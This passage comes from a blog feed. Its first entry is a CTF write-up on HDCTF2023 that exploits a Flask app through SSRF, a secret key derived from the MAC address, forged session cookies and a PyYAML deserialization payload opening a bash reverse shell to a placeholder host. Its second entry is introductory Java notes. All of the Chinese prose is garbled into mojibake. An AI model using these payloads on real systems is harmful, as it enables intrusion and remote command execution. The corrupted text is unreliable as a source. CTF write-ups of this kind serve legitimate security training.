href=&quot;[/pwd](view-source:http://node2.anna.nssctf.cn:28427/pwd)&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;boogipopè·¯ç”±å‘ç°yaml.full_load(f)å¯çŸ¥è¿™é‡Œå¯ä»¥pyyamlååºåˆ—åŒ–,è¿˜éœ€è¦ä¿®æ”¹<code>session[passport]=Welcome To HDCTF2023</code>.ç„¶åä¼ å‚file&#x3D;ä½ ä¸Šä¼ çš„æ–‡ä»¶å°±èƒ½ååºåˆ—åŒ–å…¶ä¸­çš„å†…å®¹</p><blockquote><p>å‰æçŸ¥è¯†ï¼š<br>åœ¨ python ä¸­ä½¿ç”¨ uuid æ¨¡å—ç”Ÿæˆ UUIDï¼ˆé€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼‰ã€‚å¯ä»¥ä½¿ç”¨ uuid.getnode()<br>æ–¹æ³•æ¥è·å–è®¡ç®—æœºçš„ç¡¬ä»¶åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸º UUID çš„ä¸€éƒ¨åˆ†ã€‚<br>é‚£ä¹ˆ&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addressï¼Œè¿™ä¸ªå°±æ˜¯ç½‘å¡çš„ä½ç½®ï¼Œè¯»å–ä»–è¿›è¡Œä¼ªé€ å³å¯ã€‚</p></blockquote><p>åˆ©ç”¨ä¸ºåè®®è¯»å–åˆ°ç½‘å¡åœ°å€ï¼Œåœ¨åˆ©ç”¨è„šæœ¬å†…è¿›è¡Œè§£å¯†ï¼Œä¿®æ”¹ä¸Šç­</p><p><img src="http://raw.githubusercontent.com/qingchuana/img/main/img/image-20230923160402382.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">random.seed(0x0242ac02e293)</span><br><span class="line">print(str(random.random()*233))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°secret_keyæ˜¯141.04900203197468</p><p>ä¹‹åsessionä¼ªé€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZQ6iLA.1bAPKmKsaDM4mePRtx9J7xw5EUk&quot; -s &quot;141.04900203197468&quot;</span><br><span class="line">&#123;&#x27;passport&#x27;: &#x27;YamiYami&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;python3 flask_session_cookie_manager3.py  encode -s &quot;141.04900203197468&quot; -t &quot;&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZQ6iZQ.YCpaoTH0-UzTB1p3Y82XrgKp2oU</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:list</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘½å1.txtåœ¨uploadé¡µé¢ä¸Šäº¤èº²é¿é»‘åå•<br> ç„¶ååœ¨&#x2F;boogipopè·¯ç”±ä¸‹æ”¹å˜session,file&#x3D;uploads&#x2F;1.txt</p><p>æœ€ç»ˆè¯•äº†åŠå¤©è¿‡ä¸äº†ï¼ŒçœŸæ˜¯å¥‡äº†æ€ªäº†ï¼Œå¥½åƒç¯å¢ƒæœ‰ç‚¹é—®é¢˜</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ç¬”è®°</title>
      <link href="/2023/08/24/java%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/24/java%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå­¦ä¹ "><a href="#javaå­¦ä¹ " class="headerlink" title="javaå­¦ä¹ "></a>javaå­¦ä¹ </h1><h2 id="ä¸€-ã€åŸºç¡€è¯­æ³•"><a href="#ä¸€-ã€åŸºç¡€è¯­æ³•" class="headerlink" title="ä¸€ ã€åŸºç¡€è¯­æ³•"></a>ä¸€ ã€åŸºç¡€è¯­æ³•</h2><p>åˆ›å»ºæ–‡ä»¶ <strong>HelloWorld.java(æ–‡ä»¶åéœ€ä¸ç±»åä¸€è‡´)</strong></p><p>è¾“å…¥pvsmå›è½¦è‡ªåŠ¨åˆ›å»ºä¸»å‡½æ•°ï¼Œsoutè¾“å‡ºæ‰“å°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pvsm-ã€‹public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sout-&gt;System.out.println();</span><br></pre></td></tr></table></figure><p>ç¼–å†™ Java ç¨‹åºæ—¶ï¼Œåº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>â€‹<strong>å¤§å°å†™æ•æ„Ÿ</strong>ï¼šJava æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œè¿™å°±æ„å‘³ç€æ ‡è¯†ç¬¦ Hello ä¸ hello æ˜¯ä¸åŒçš„ã€‚</li><li>â€‹<strong>ç±»å</strong>ï¼šå¯¹äºæ‰€æœ‰çš„ç±»æ¥è¯´ï¼Œç±»åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ã€‚å¦‚æœç±»åç”±è‹¥å¹²å•è¯ç»„æˆï¼Œé‚£ä¹ˆæ¯ä¸ªå•è¯çš„é¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œä¾‹å¦‚ <strong>MyFirstJavaClass</strong> ã€‚</li><li>â€‹<strong>æ–¹æ³•å</strong>ï¼šæ‰€æœ‰çš„æ–¹æ³•åéƒ½åº”è¯¥ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚å¦‚æœæ–¹æ³•åå«æœ‰è‹¥å¹²å•è¯ï¼Œåˆ™åé¢çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ã€‚</li><li>â€‹<strong>æºæ–‡ä»¶å</strong>ï¼šæºæ–‡ä»¶åå¿…é¡»å’Œç±»åç›¸åŒã€‚å½“ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œä½ åº”è¯¥ä½¿ç”¨ç±»åä½œä¸ºæ–‡ä»¶åä¿å­˜ï¼ˆåˆ‡è®° Java æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼‰ï¼Œæ–‡ä»¶åçš„åç¼€ä¸º <strong>.java</strong>ã€‚ï¼ˆå¦‚æœæ–‡ä»¶åå’Œç±»åä¸ç›¸åŒåˆ™ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼‰ã€‚</li><li>â€‹<strong>ä¸»æ–¹æ³•å…¥å£</strong>ï¼šæ‰€æœ‰çš„ Java ç¨‹åºç”± <strong>public static void main(String[] args)</strong> æ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚</li></ul><p>###æ³¨é‡Šç±»å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å•è¡Œæ³¨é‡Š//</span><br><span class="line"></span><br><span class="line">å¤šè¡Œæ³¨é‡Š/**/</span><br><span class="line"></span><br><span class="line">æ–‡æ¡£æ³¨é‡Š/**</span><br><span class="line">*1</span><br><span class="line">*1</span><br><span class="line">*1</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ ‡è¯†ç¬¦å’Œå…³é”®å­—"><a href="#æ ‡è¯†ç¬¦å’Œå…³é”®å­—" class="headerlink" title="æ ‡è¯†ç¬¦å’Œå…³é”®å­—"></a>æ ‡è¯†ç¬¦å’Œå…³é”®å­—</h3><p>Java æ‰€æœ‰çš„ç»„æˆéƒ¨åˆ†éƒ½éœ€è¦åå­—ã€‚ç±»åã€å˜é‡åä»¥åŠæ–¹æ³•åéƒ½è¢«ç§°ä¸ºæ ‡è¯†ç¬¦ã€‚</p><p>å…³äº Java æ ‡è¯†ç¬¦ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ul><li>â€‹æ‰€æœ‰çš„æ ‡è¯†ç¬¦éƒ½åº”è¯¥ä»¥å­—æ¯ï¼ˆA-Z æˆ–è€… a-zï¼‰,ç¾å…ƒç¬¦ï¼ˆ$ï¼‰ã€æˆ–è€…ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰å¼€å§‹</li><li>â€‹é¦–å­—ç¬¦ä¹‹åå¯ä»¥æ˜¯å­—æ¯ï¼ˆA-Z æˆ–è€… a-zï¼‰,ç¾å…ƒç¬¦ï¼ˆ$ï¼‰ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰æˆ–æ•°å­—çš„ä»»ä½•å­—ç¬¦ç»„åˆ</li><li>â€‹å…³é”®å­—ä¸èƒ½ç”¨ä½œæ ‡è¯†ç¬¦</li><li>â€‹æ ‡è¯†ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„</li><li>â€‹åˆæ³•æ ‡è¯†ç¬¦ä¸¾ä¾‹ï¼šageã€$salaryã€_valueã€__1_value</li><li>â€‹éæ³•æ ‡è¯†ç¬¦ä¸¾ä¾‹ï¼š123abcã€-salary</li></ul><p>å¯ä»¥ä½¿ç”¨ä¸­æ–‡ï¼Œä½†ä¸å»ºè®®ä½¿ç”¨ï¼Œæ‹¼éŸ³ä¹Ÿå°‘ç”¨ï¼Œæ˜¾å¾—ä¸å’‹å¥½</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230821132029953-1698627034978-1-1700990364418-195-1700994560237-169.png"></p><p>é¢åˆ—å‡ºäº† Java å…³é”®å­—ã€‚è¿™äº›ä¿ç•™å­—ä¸èƒ½ç”¨äºå¸¸é‡ã€å˜é‡ã€å’Œä»»ä½•æ ‡è¯†ç¬¦çš„åç§°ã€‚</p><table><thead><tr><th>ç±»åˆ«</th><th>å…³é”®å­—</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>è®¿é—®æ§åˆ¶</td><td>private</td><td>ç§æœ‰çš„</td></tr><tr><td>protected</td><td>å—ä¿æŠ¤çš„</td><td></td></tr><tr><td>public</td><td>å…¬å…±çš„</td><td></td></tr><tr><td>default</td><td>é»˜è®¤</td><td></td></tr><tr><td>ç±»ã€æ–¹æ³•å’Œå˜é‡ä¿®é¥°ç¬¦</td><td>abstract</td><td>å£°æ˜æŠ½è±¡</td></tr><tr><td>class</td><td>ç±»</td><td></td></tr><tr><td>extends</td><td>æ‰©å……ã€ç»§æ‰¿</td><td></td></tr><tr><td>final</td><td>æœ€ç»ˆå€¼ã€ä¸å¯æ”¹å˜çš„</td><td></td></tr><tr><td>implements</td><td>å®ç°ï¼ˆæ¥å£ï¼‰</td><td></td></tr><tr><td>interface</td><td>æ¥å£</td><td></td></tr><tr><td>native</td><td>æœ¬åœ°ã€åŸç”Ÿæ–¹æ³•ï¼ˆé Java å®ç°ï¼‰</td><td></td></tr><tr><td>new</td><td>åˆ›å»º</td><td></td></tr><tr><td>static</td><td>é™æ€</td><td></td></tr><tr><td>strictfp</td><td>ä¸¥æ ¼æµ®ç‚¹ã€ç²¾å‡†æµ®ç‚¹</td><td></td></tr><tr><td>synchronized</td><td>çº¿ç¨‹ã€åŒæ­¥</td><td></td></tr><tr><td>transient</td><td>çŸ­æš‚</td><td></td></tr><tr><td>volatile</td><td>æ˜“å¤±</td><td></td></tr><tr><td>ç¨‹åºæ§åˆ¶è¯­å¥</td><td>break</td><td>è·³å‡ºå¾ªç¯</td></tr><tr><td>case</td><td>å®šä¹‰ä¸€ä¸ªå€¼ä»¥ä¾› switch é€‰æ‹©</td><td></td></tr><tr><td>continue</td><td>ç»§ç»­</td><td></td></tr><tr><td>do</td><td>è¿è¡Œ</td><td></td></tr><tr><td>else</td><td>å¦åˆ™</td><td></td></tr><tr><td>for</td><td>å¾ªç¯</td><td></td></tr><tr><td>if</td><td>å¦‚æœ</td><td></td></tr><tr><td>instanceof</td><td>å®ä¾‹</td><td></td></tr><tr><td>return</td><td>è¿”å›</td><td></td></tr><tr><td>switch</td><td>æ ¹æ®å€¼é€‰æ‹©æ‰§è¡Œ</td><td></td></tr><tr><td>while</td><td>å¾ªç¯</td><td></td></tr><tr><td>é”™è¯¯å¤„ç†</td><td>assert</td><td>æ–­è¨€è¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸ</td></tr><tr><td>catch</td><td>æ•æ‰å¼‚å¸¸</td><td></td></tr><tr><td>finally</td><td>æœ‰æ²¡æœ‰å¼‚å¸¸éƒ½æ‰§è¡Œ</td><td></td></tr><tr><td>throw</td><td>æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡</td><td></td></tr><tr><td>throws</td><td>å£°æ˜ä¸€ä¸ªå¼‚å¸¸å¯èƒ½è¢«æŠ›å‡º</td><td></td></tr><tr><td>try</td><td>æ•è·å¼‚å¸¸</td><td></td></tr><tr><td>åŒ…ç›¸å…³</td><td>import</td><td>å¼•å…¥</td></tr><tr><td>package</td><td>åŒ…</td><td></td></tr><tr><td>åŸºæœ¬ç±»å‹</td><td>boolean</td><td>å¸ƒå°”å‹</td></tr><tr><td>byte</td><td>å­—èŠ‚å‹</td><td></td></tr><tr><td>char</td><td>å­—ç¬¦å‹</td><td></td></tr><tr><td>double</td><td>åŒç²¾åº¦æµ®ç‚¹</td><td></td></tr><tr><td>float</td><td>å•ç²¾åº¦æµ®ç‚¹</td><td></td></tr><tr><td>int</td><td>æ•´å‹</td><td></td></tr><tr><td>long</td><td>é•¿æ•´å‹</td><td></td></tr><tr><td>short</td><td>çŸ­æ•´å‹</td><td></td></tr><tr><td>å˜é‡å¼•ç”¨</td><td>super</td><td>çˆ¶ç±»ã€è¶…ç±»</td></tr><tr><td>this</td><td>æœ¬ç±»</td><td></td></tr><tr><td>void</td><td>æ— è¿”å›å€¼</td><td></td></tr><tr><td>ä¿ç•™å…³é”®å­—</td><td>goto</td><td>æ˜¯å…³é”®å­—ï¼Œä½†ä¸èƒ½ä½¿ç”¨</td></tr><tr><td>const</td><td>æ˜¯å…³é”®å­—ï¼Œä½†ä¸èƒ½ä½¿ç”¨</td><td></td></tr></tbody></table><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>javaæ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œæ‰€æœ‰å˜é‡å¿…é¡»å®šä»¥åæ‰èƒ½ä½¿ç”¨ï¼Œæ›´å®‰å…¨</p><p>javaæ•°æ®ç±»å‹å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»:</p><p>åŸºæœ¬ç±»å‹</p><p>å¼•ç”¨ç±»å‹</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230821133215837-1692596095569-1-1693831300400-56-1698627034979-3-1700990364418-197-1700994560237-172.png"></p><p>æ¯ä¸ªå˜é‡éƒ½æœ‰ç±»å‹ï¼Œå¿…é¡»å¯¹åº”</p><table><thead><tr><th>åŸºæœ¬ç±»å‹</th><th>boolean</th><th>å¸ƒå°”å‹</th></tr></thead><tbody><tr><td>byte</td><td>å­—èŠ‚å‹</td><td></td></tr><tr><td>char</td><td>å­—ç¬¦å‹</td><td></td></tr><tr><td>double</td><td>åŒç²¾åº¦æµ®ç‚¹</td><td></td></tr><tr><td>float</td><td>å•ç²¾åº¦æµ®ç‚¹</td><td></td></tr><tr><td>int</td><td>æ•´å‹</td><td></td></tr><tr><td>long</td><td>é•¿æ•´å‹</td><td></td></tr><tr><td>short</td><td>çŸ­æ•´å‹</td><td></td></tr></tbody></table><p>åŒºåˆ«å»longï¼Œæ•°å­—åé¢ä¸€èˆ¬åŠ ä¸€ä¸ªL</p><p>floatæ•°å­—ååŠ F</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230821134831928.png" alt="image-20230821134831928"></p><h5 id="ä»€ä¹ˆæ˜¯å­—èŠ‚"><a href="#ä»€ä¹ˆæ˜¯å­—èŠ‚" class="headerlink" title="ä»€ä¹ˆæ˜¯å­—èŠ‚"></a>ä»€ä¹ˆæ˜¯å­—èŠ‚</h5><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230821135115539-1698627034979-5-1700990364418-198-1700994560237-170.png"></p><p>###æ•°æ®ç±»å‹æ‹“å±•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String a=10;</span></span><br><span class="line"><span class="comment">//        String b=&quot;10&quot;;</span></span><br><span class="line">        <span class="comment">//æ•´æ•°æ‹“å±•  è¿›åˆ¶  äºŒè¿›åˆ¶0b</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> i1=<span class="number">010</span>;<span class="comment">//8è¿›åˆ¶</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span><span class="number">0x10</span>;<span class="comment">//16è¿›åˆ¶</span></span><br><span class="line">        System.out.println(i);</span><br><span class="line">        System.out.println(i1);</span><br><span class="line">        System.out.println(i2);</span><br><span class="line">        <span class="comment">//æµ®ç‚¹æ•°æ‰©å±•</span></span><br><span class="line">        <span class="comment">//float   æœ‰é™  ç¦»æ•£  èˆå…¥è¯¯å·®  å¤§çº¦</span></span><br><span class="line">        <span class="comment">//double</span></span><br><span class="line">        <span class="comment">//æœ€å¥½å®Œå…¨ä½¿ç”¨æµ®ç‚¹æ•°è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">        <span class="comment">//bigã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line">        <span class="type">float</span> f=<span class="number">0.1f</span>;</span><br><span class="line">        <span class="type">double</span> d=<span class="number">1.0</span>/<span class="number">10</span>;</span><br><span class="line">        System.out.println(f==d);</span><br><span class="line">        <span class="type">float</span> d1=<span class="number">123123123123f</span>;</span><br><span class="line">        <span class="type">float</span> d2=d1+<span class="number">1</span>;</span><br><span class="line">        System.out.println(d1=d2);</span><br><span class="line">        <span class="comment">//å­—ç¬¦æ‹“å±•</span></span><br><span class="line">        <span class="type">char</span> c1=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span><span class="string">&#x27;ä¸­&#x27;</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c1);<span class="comment">//å¼ºåˆ¶è½¬æ¢</span></span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c2);<span class="comment">//å¼ºåˆ¶è½¬æ¢</span></span><br><span class="line">        <span class="comment">//æ‰€ä»¥å­—ç¬¦æœ¬è´¨è¿˜æ˜¯æ•°å­—</span></span><br><span class="line">        <span class="comment">//ç¼–ç  unicode 2å­—èŠ‚  65536 excel  2 16=65536</span></span><br><span class="line">        <span class="type">char</span> c3=<span class="string">&#x27;\u0061&#x27;</span>;</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        <span class="comment">//è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line">        <span class="comment">// \t</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello\tworldï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="è½¬ä¹‰å­—ç¬¦"><a href="#è½¬ä¹‰å­—ç¬¦" class="headerlink" title="è½¬ä¹‰å­—ç¬¦"></a>è½¬ä¹‰å­—ç¬¦</h5><table><thead><tr><th>n</th><th>æ¢è¡Œ (0x0a)</th></tr></thead><tbody><tr><td>\r</td><td>å›è½¦ (0x0d)</td></tr><tr><td>\f</td><td>æ¢é¡µç¬¦(0x0c)</td></tr><tr><td>\b</td><td>é€€æ ¼ (0x08)</td></tr><tr><td>\0</td><td>ç©ºå­—ç¬¦ (0x0)</td></tr><tr><td>\s</td><td>ç©ºæ ¼ (0x20)</td></tr><tr><td>\t</td><td>åˆ¶è¡¨ç¬¦</td></tr><tr><td>&quot;</td><td>åŒå¼•å·</td></tr><tr><td>&#39;</td><td>å•å¼•å·</td></tr><tr><td>\</td><td>åæ–œæ </td></tr><tr><td>\ddd</td><td>å…«è¿›åˆ¶å­—ç¬¦ (ddd)</td></tr><tr><td>\uxxxx</td><td>16è¿›åˆ¶Unicodeå­—ç¬¦ (xxxx)</td></tr></tbody></table><h3 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h3><p>ç”±äºjavaæ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œæ‰€ä»¥è¦è¿›è¡Œæœ‰äº›è¿ç®—çš„æ—¶å€™ï¼Œéœ€è¦ç”¨åˆ°ç±»è½¬æ¢</p><p>ä½â€”â€”â€”â€”â€”â€”&gt;é«˜</p><p>byte,short,char-&gt;iny-&gt;long-&gt;float-&gt;doubleï¼ˆå°æ•°ä¼˜å…ˆçº§æ¯”è¾ƒé«˜ï¼‰</p><p>è¿ç®—ä¸­ï¼Œä¸åŒç±»å‹çš„æ•°æ®ä¼šå…ˆè½¬åŒ–ä¸ºåŒä¸€ç±»å‹ï¼Œç„¶åè¿›è¡Œè¿ç®—</p><p>å¼ºåˆ¶ç±»å‹è½¬æ¢  ï¼ˆç±»å‹ï¼‰å˜é‡å  é«˜â€“ã€‹ä½</p><p>è‡ªåŠ¨ç±»å‹è½¬æ¢  ä½â€“ã€‹é«˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 